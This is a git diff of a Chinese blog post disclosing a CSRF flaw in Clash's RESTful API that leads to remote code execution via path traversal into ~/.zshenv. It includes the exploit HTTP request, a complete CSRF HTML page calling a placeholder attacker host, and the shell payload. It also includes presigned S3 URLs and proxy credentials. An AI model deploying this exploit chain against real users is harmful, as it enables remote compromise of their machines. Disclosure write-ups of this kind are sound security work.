@@ -8,7 +8,7 @@ updated: 2023-05-14T00:00:00+00:00
 date: 2022-10-20T00:00:00+00:00
 slug: clash-unauth-force-configs-csrf-rce
 title: 流行代理软件Clash CSRF未授权配置重载致使RCE
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d273f544-05f9-4a1f-a2b8-641d3fa037a1/breaking-clash-on-chrome.gif?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=408866eb631df949a3eea53671bbd195f30f3c6029136fbdc96cbb06d75c4a06&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/clash-unauth-force-configs-csrf-rce/breaking-clash-on-chrome.gif
 id: 111906e1-7468-80ba-9c45-f09fbc936262
 ---
 
@@ -42,7 +42,7 @@ $ clash -v
 Clash unknown version linux amd64 with go1.19.1 unknown time
 ```
 
-为图使用方便，参考官方文档（[https://github.com/Dreamacro/clash/wiki/Running-Clash-as-a-service](https://github.com/Dreamacro/clash/wiki/Running-Clash-as-a-service)），将 Clash 通过 systemd 服务来管理运行，这里不过多赘述。
+为图使用方便，参考官方文档（<https://github.com/Dreamacro/clash/wiki/Running-Clash-as-a-service>），将 Clash 通过 systemd 服务来管理运行，这里不过多赘述。
 
 试着第一次运行它，可以发现它会自动创建目录和相关配置文件。
 
@@ -62,9 +62,9 @@ cache.db  config.yaml  Country.mmdb
 body="自动抓取tg频道、订阅地址、公开互联网上的ss、ssr、vmess、trojan节点信息"
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5fdf06f5-fc88-408c-8b70-3a530fa7a00c/free-proxies-on-fofa.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=96b3a6cb18e854f91c9943fe9ba44c1d54171899d9db96cefca241d365b60e76&X-Amz-SignedHeaders=host&x-id=GetObject)
+![free-proxies-on-fofa](/img/post/clash-unauth-force-configs-csrf-rce/free-proxies-on-fofa.png)
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/8ec67616-90fc-46e4-be86-b03259da2811/proxypool.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=4b8f99f5fbf723ddadf2b03d9facf7ee096b6222bfb13bf2733084739aea1c6b&X-Amz-SignedHeaders=host&x-id=GetObject)
+![proxypool](/img/post/clash-unauth-force-configs-csrf-rce/proxypool.png)
 
 将其下载下来，放到指定位置，就可以使用了。
 
@@ -142,14 +142,14 @@ IP	: 152.70.74.66
 
 数据三	: 美国加利福尼亚
 
-URL	: <http://www.cip.cc/152.70.74.66>
+URL	: http://www.cip.cc/152.70.74.66
 ```
 
 ### macOS 平台
 
 在 macOS 上，一般都是使用有 GUI 的 ClashX 或 CFW。以下为 ClashX 使用步骤，CFW 的使用类似，不作过多说明。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e93f6987-edac-4b0a-b305-f526afdd02ba/clashx-on-macos.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=11c179a6727bba829e97668135d363c1c81c37e082f073ce58887b74bc1a71b6&X-Amz-SignedHeaders=host&x-id=GetObject)
+![clashx-on-macos](/img/post/clash-unauth-force-configs-csrf-rce/clashx-on-macos.png)
 
 ClashX 初次运行会在`~/.config/clash/`目录产生一个名为 config.yaml 的主配置文件，文件内容如下。
 
@@ -188,7 +188,7 @@ rules:
 
 ClashX 的使用也是基于一份配置文件，同样只需将可用的主配置文件放到`~/.config/clash/`目录下，之后就可以使用了。具体步骤就是点击右上角 ClashX 图标，依次选择「Config」-「Remote config」-「Manage」-「Add」，将远程链接填入 Url 栏中即可自动下载远程的配置文件到本地。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/3ced87ba-fa90-4c2e-bf6f-ff22d0611ad7/remote-clashx-config.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=51593a13170d233e420a8effdf7a4a58a8822e30949796ab66645679af721893&X-Amz-SignedHeaders=host&x-id=GetObject)
+![remote-clashx-config](/img/post/clash-unauth-force-configs-csrf-rce/remote-clashx-config.png)
 
 可以观察到一个现象，将远程配置文件下载到本地的同时，还在本地创建了一个目录，该目录存放的是各种不同地区的`provider`配置文件，与在 Linux 上观察的现象一样。
 
@@ -203,36 +203,36 @@ Clash 一个强大的功能就是能够管理不同的多种类型的代理协�
 ```yaml
 # 部分配置参考
 # load-balance: The request of the same eTLD+1 will be dial to the same proxy.
-- name: "load-balance"
-  type: load-balance
-  proxies:
-    - ss1
-    - ss2
-    - vmess1
-  url: "http://www.gstatic.com/generate_204"
-  interval: 300
-  strategy: round-robin # or consistent-hashing
+  - name: "load-balance"
+    type: load-balance
+    proxies:
+      - ss1
+      - ss2
+      - vmess1
+    url: 'http://www.gstatic.com/generate_204'
+    interval: 300
+    strategy: round-robin # or consistent-hashing
 ```
 
 效果如下图所示，秒级别切换 IP 代理地址。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/74506be6-1071-4aec-9452-4112aa6feacf/fast-switch-proxy.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=481e54f812ae21cad2dd21fdadee5502e87d995cfe7b8ed3f46e03c87b6d9dc4&X-Amz-SignedHeaders=host&x-id=GetObject)
+![fast-switch-proxy](/img/post/clash-unauth-force-configs-csrf-rce/fast-switch-proxy.png)
 
 ## 历史漏洞
 
 ### CFW XSS2RCE - 2022/02/23
 
 > Clash For Windows 是由 Electron 提供的。如果一个 XSS 有效载荷是以代理的名义，我们可以在受害者的电脑上远程执行任何 JavaScript 代码。
-
-    ![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/cb84f2e9-e62b-4271-9ec2-4cc7e1ae8fa4/cfw-issue-2710.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050202Z&X-Amz-Expires=3600&X-Amz-Signature=200c10a824f7cb9b1d5befaa1c18ac0982a9135b21681fb44ebe0bf1600623ee&X-Amz-SignedHeaders=host&x-id=GetObject)
+>
+> ![cfw-issue-2710](/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-2710.png)
 
 详见此 issue：[[Bug]: Remote Code Execution/远程代码执行 #2710](https://github.com/Fndroid/clash_for_windows_pkg/issues/2710)。
 
 ### CFW 路径穿越致使 parsers JS RCE - 2023/01/13
 
 > Windows 上的 clash_for_windows 在 0.20.12 在订阅一个恶意链接时存在远程命令执行漏洞。因为对订阅文件中 rule-providers 的 path 的不安全处理导致 cfw-setting.yaml 会被覆盖，cfw-setting.yaml 中 parsers 的 js 代码将会被执行。
-
-    ![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/57fd4567-76bc-4cbb-8f33-841e0864d4bf/cfw-issue-3891.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050202Z&X-Amz-Expires=3600&X-Amz-Signature=037868ccefe19c20496a688ec8195e8a2169d38c57141d78113a11b82e825f78&X-Amz-SignedHeaders=host&x-id=GetObject)
+>
+> ![cfw-issue-3891](/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-3891.png)
 
 详见此 issue：[[Bug]: Remote Code Execution/远程代码执行 #3891](https://github.com/Fndroid/clash_for_windows_pkg/issues/3891)。
 
@@ -388,7 +388,7 @@ func parseProxies(cfg *RawConfig) (proxies map[string]C.Proxy, providersMap map[
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e5cb2076-3c5f-4ab5-a56c-787667bca303/config-parseProxies.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=62a3507f29965983403cad3bd96d4ef19eba32ee1e20067f1992a5703eabf4bd&X-Amz-SignedHeaders=host&x-id=GetObject)
+![config-parseProxies](/img/post/clash-unauth-force-configs-csrf-rce/config-parseProxies.png)
 
 首先是创建了一个空 map `providersMap`。
 
@@ -437,15 +437,15 @@ type proxyProviderSchema struct {
 
 在`ParseProxyProvider`中，使用了`constant.Path.Resolve`对`Path`做了处理。
 
-```text
+```golang
 path := C.Path.Resolve(schema.Path)
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e033f16d-1cd0-4d27-92f3-fc86785106e9/parse-ParseProxyProvider.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=f756df97737636bd57339d37fe324f0a2871e7ecfe1cfc7f0edfa7ad3ca55bca&X-Amz-SignedHeaders=host&x-id=GetObject)
+![parse-ParseProxyProvider](/img/post/clash-unauth-force-configs-csrf-rce/parse-ParseProxyProvider.png)
 
 那么进入到`contant/path.go`文件中，`Resolve`内容如下。
 
-```text
+```golang
 // Resolve return a absolute path or a relative path with homedir
 func (p *path) Resolve(path string) string {
 	if !filepath.IsAbs(path) {
@@ -511,7 +511,7 @@ func NewProxySetProvider(name string, interval time.Duration, filter string, veh
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/19beda58-54fa-4926-a1b2-fb843a6ee58c/provider-newFetcher.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=be4ad4e13db5aa37d87ae1093675c5f34d15f7e8246b352e6866c0a61fc33cdc&X-Amz-SignedHeaders=host&x-id=GetObject)
+![provider-newFetcher](/img/post/clash-unauth-force-configs-csrf-rce/provider-newFetcher.png)
 
 `wrapper`最终返回到`config/config.go`中作为`pd`变量的值。pd 作为值赋给`providersMap["us"]`。
 
@@ -524,7 +524,7 @@ if err != nil {
 providersMap[name] = pd
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ff4d03ed-fb9b-452a-bc4b-f26edb2d6dc0/clash-parse-debug.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7c67244e6347658d9c8b3e6ee9e7cf5e1e258c54f67a0d382e1cec0472a60358&X-Amz-SignedHeaders=host&x-id=GetObject)
+![clash-parse-debug](/img/post/clash-unauth-force-configs-csrf-rce/clash-parse-debug.png)
 
 ### initial providers
 
@@ -563,7 +563,7 @@ if f.vehicle.Type() != types.File && !isLocal {
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d5dafbb4-6d9e-41fd-84cc-8171dfdd496b/fetcher-Initial.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=1fba489071803c94ccc8a3fc688c57011d0f67ffadc321543d59a01df13e38dd&X-Amz-SignedHeaders=host&x-id=GetObject)
+![fetcher-Initial](/img/post/clash-unauth-force-configs-csrf-rce/fetcher-Initial.png)
 
 `safeWrite`函数实现如下。
 
@@ -668,19 +668,7 @@ open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10
   aaaaa: 11111
 
 proxies:
-  - {
-      name: vP,
-      server: n04.a00x.party,
-      port: 18000,
-      type: ssr,
-      cipher: aes-256-cfb,
-      password: AFX92CS,
-      protocol: auth_aes128_sha1,
-      obfs: http_simple,
-      protocol-param: 232991:xSnSFv,
-      obfs-param: download.windowsupdate.com,
-      udp: true,
-    }
+  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}
 
 aaaaa: 2222
 ```
@@ -689,7 +677,7 @@ aaaaa: 2222
 
 但是可以发现，上面那种利用方式的局限性就在于，需要受害者手动去导入一个不可信的远程配置，这对于攻击者来说，未必是那么容易实现。那么有没有一种方式能让受害者自动导入一个不可信的远程配置呢？
 
-根据 Clash 官方文档的介绍（[https://clash.gitbook.io/doc/restful-api](https://clash.gitbook.io/doc/restful-api)），Clash 存在一套 RESTful API 可以用于控制自身，能获取 Clash 中的一些信息，同时也能控制 Clash 内部的配置。
+根据 Clash 官方文档的介绍（https://clash.gitbook.io/doc/restful-api），Clash 存在一套 RESTful API 可以用于控制自身，能获取 Clash 中的一些信息，同时也能控制 Clash 内部的配置。
 
 在 Clash 的配置文件中加入`external-controller`字段，即可去访问。
 
@@ -699,7 +687,7 @@ external-controller: 127.0.0.1:9090
 {"hello":"clash"}
 
 # 获得Clash当前的基础配置
-$ curl -s <http://127.0.0.1:9090/configs> | jq .
+$ curl -s http://127.0.0.1:9090/configs | jq .
 {
   "port": 7890,
   "socks-port": 7891,
@@ -719,7 +707,7 @@ $ curl -s <http://127.0.0.1:9090/configs> | jq .
 
 > 如果不是为了特殊需求，请尽量不要把 API 暴露在 0.0.0.0，如果真的要这么做，一定要加上 secret 进行鉴权
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/913497cf-72dd-4532-9488-a136bdf49042/clash-on-internet.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=72b45f0ed515adf3741e65cd75ff2395db50861149069ec096294d63f7221293&X-Amz-SignedHeaders=host&x-id=GetObject)
+![clash-on-internet](/img/post/clash-unauth-force-configs-csrf-rce/clash-on-internet.png)
 
 上图是公网暴露的 Clash，它们的`external-controller`均为`0.0.0.0`。
 
@@ -729,11 +717,11 @@ $ curl -s <http://127.0.0.1:9090/configs> | jq .
 
 继续查阅 RESTful API 接口，发现某个 API 可以重新加载配置文件，这里倒是引起了注意力。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5e39b98b-8b26-4ed3-aedf-e15dcb97be6e/put-clash-configs.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=43858e7d211bc8be87555df1dcb894fb8f24ce2ad895d217c34f304483e30a84&X-Amz-SignedHeaders=host&x-id=GetObject)
+![put-clash-configs](/img/post/clash-unauth-force-configs-csrf-rce/put-clash-configs.png)
 
 对重新加载配置文件功能点进行白盒代码审计，首先先跟进`/configs`路由的代码。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f2e88779-1441-4719-8c7f-805fdc28920d/clash-updateConfigs.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=035fdc8c03bae9aa1a348c1de35e934dee0913f52b3b8d0b79ce4f2b2b5a4530&X-Amz-SignedHeaders=host&x-id=GetObject)
+![clash-updateConfigs](/img/post/clash-unauth-force-configs-csrf-rce/clash-updateConfigs.png)
 
 关键代码`updateConfigs`函数的内容如下。
 
@@ -884,7 +872,7 @@ func ParseRawConfig(rawCfg *RawConfig) (*Config, error) {
 
 HTTP 报文如下，同时本地提供一个 9999 端口的 Web 服务，对外提供 evil.yaml 文件。
 
-```text
+```http
 PUT /configs?force=true HTTP/1.1
 Host: 127.0.0.1:9090
 Accept-Encoding: gzip, deflate
@@ -898,11 +886,11 @@ Content-Length: 326
 {"payload":"mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http://127.0.0.1:9999/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"}
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/9587821f-8bd7-4c43-a7c2-e77aa944c0cc/burp-put-configs.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=41ecc8232bc826f0a047a29f614fa056522bf203e27388a7c74991776f98f59f&X-Amz-SignedHeaders=host&x-id=GetObject)
+![burp-put-configs](/img/post/clash-unauth-force-configs-csrf-rce/burp-put-configs.png)
 
 观察 HTTP 日志可以发现，来自 Clash 的请求，请求 evil.yaml 文件，并将其写入至本地`../../.zshenv`路径。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/0803dad4-61e6-40f1-a3fe-5f822be8125a/iterm2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=13402cc7d0c30b11adfd813b81c49f20c2bbae3f62653420ebff68980174521b&X-Amz-SignedHeaders=host&x-id=GetObject)
+![iterm2](/img/post/clash-unauth-force-configs-csrf-rce/iterm2.png)
 
 当打开一个 zsh 终端，如下命令就会被执行。
 
@@ -910,7 +898,7 @@ Content-Length: 326
 open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10 2>&1 > /dev/null &
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/93552ee0-899d-47cd-bba6-b31088cce341/open-terminal-rce.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=90ed2918dc7321162a2662876317b0ac22baeb2c698fc20790f2ddb7db905ab1&X-Amz-SignedHeaders=host&x-id=GetObject)
+![open-terminal-rce](/img/post/clash-unauth-force-configs-csrf-rce/open-terminal-rce.png)
 
 ## CSRF2RCE
 
@@ -920,53 +908,46 @@ open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10
 
 但是不过根据官方文档的说法，Clash 的 RESTful API 支持 CORS（跨域资源共享），这样就直接解锁了跨域的限制。
 
-> CORS
-
-    为了能使 Clash 更加灵活，RESTful API 支持 CORS 让使用者能从浏览器使用 XHR、fetch 调用。
+> **CORS**
+>
+> 为了能使 Clash 更加灵活，RESTful API 支持 CORS 让使用者能从浏览器使用 XHR、fetch 调用。
 
 那么攻击者可以构造一个恶意的网页，当受害者使用浏览器访问时，浏览器将会执行攻击者精心构造的 JS 代码，此时将是受害者自身的浏览器去请求 Clash 的 RESTful API，从而间接地达到强制重载受害者 Clash 的配置文件的目的。
 
 ```html
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Breaking Clash</title>
-  </head>
+</head>
 
-  <body>
+<body>
     <h1 align="center">Breaking Clash</h1>
-    <p align="center">
-      <img
-        src="https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png"
-      />
-    </p>
+    <p align="center"> <img src="https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png"></p>
     <p>
-      <script>
-        const data = {
-          payload:
-            "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http://{{yourevilser}}/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204",
-        };
-        fetch("http://127.0.0.1:9090/configs?force=true", {
-          method: "PUT",
-          headers: {
-            "Content-type": "application/json; charset=utf-8",
-          },
-          body: JSON.stringify(data),
-        })
-          .then((response) => response.json())
-          .then((data) => {
-            console.log("Success:", data);
-          })
-          .catch((error) => {
-            console.log("Error:", error);
-          });
-      </script>
-    </p>
-  </body>
-</html>
+        <script>        
+            const data = {
+                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http://{{yourevilser}}/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"
+            };
+            fetch('http://127.0.0.1:9090/configs?force=true', {
+                method: 'PUT',
+                headers: {
+                    'Content-type': 'application/json; charset=utf-8',
+                },
+                body: JSON.stringify(data),
+            }).then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.log('Error:', error);
+                });
+        </script>
+</body>
+</html
 ```
 
 在公网起一个 Web 服务，同时允许跨域，对外提供如上 index.html 和 evil.yaml 恶意文件，evil.yaml 文件中包含了攻击者期望执行的命令。注意将如上 html 中的`{{yourevilser}}`换成你自己的 IP 或者域名。
@@ -1009,19 +990,19 @@ $ go run main.go
 
 当 macOS 用户在日常使用 ClashX 时，此时打开一条来自攻击者发过来的恶意链接时，浏览器就会自动去请求 Clash 的 RESTful API，如下图所示，使用最新版 Firefox 和 Safari 浏览器都成功对本地 Clash 发出了请求，Firefox 和 Safari 浏览器比较宽松。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/2d6b4eba-bef7-4c8e-a26d-70cee216af5a/firefox.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=be39e4d2902d22cf16280ff9153fedf6e2fbf8eec5e658a28182bc6b3db8a5e1&X-Amz-SignedHeaders=host&x-id=GetObject)
+![firefox](/img/post/clash-unauth-force-configs-csrf-rce/firefox.png)
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d297fae2-77c7-4d45-b88c-8cc8075e8c45/safari.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=903df505bdfad71e289ccc6ac37b57261a9cedd58a9be5483339ea405aaa8a1d&X-Amz-SignedHeaders=host&x-id=GetObject)
+![safari](/img/post/clash-unauth-force-configs-csrf-rce/safari.png)
 
 而由于 Chrome 浏览器推出的[Private Network Access](https://developer.chrome.com/blog/private-network-access-update/?utm_source=devtools)安全策略，不允许公网 HTTP 协议的网站对本地网络进行请求，对于 Chrome 浏览器协议最好使用 HTTPS。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c5f255b7-9d49-49e3-9a2f-9607c8e59439/chrome.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=bf0a3c0292d98d081ec23821de6ec23a09497e8bce751d50b96e905f631b51fc&X-Amz-SignedHeaders=host&x-id=GetObject)
+![chrome](/img/post/clash-unauth-force-configs-csrf-rce/chrome.png)
 
 所以最终恶意网站统一使用 HTTPS 协议，这样便可以同时兼容三大浏览器。
 
 浏览器成功对 Clash RESTful API 发送请求后，之后 Clash 会自动将 evil.yaml 下载到受害者本地`~/.zshenv`路径，当受害者打开终端时，就会自动执行此文件中的内容。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a2ab9f9b-c495-4e6d-af88-f31f2abd805e/breaking-clash-on-chrome.gif?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=fa4ff955981ad4e91b87ca4acaba531ff4f9c99ec1256504fd39bf63bec52e96&X-Amz-SignedHeaders=host&x-id=GetObject)
+![breaking-clash-on-chrome](/img/post/clash-unauth-force-configs-csrf-rce/breaking-clash-on-chrome.gif)
 
 ## 总结
 
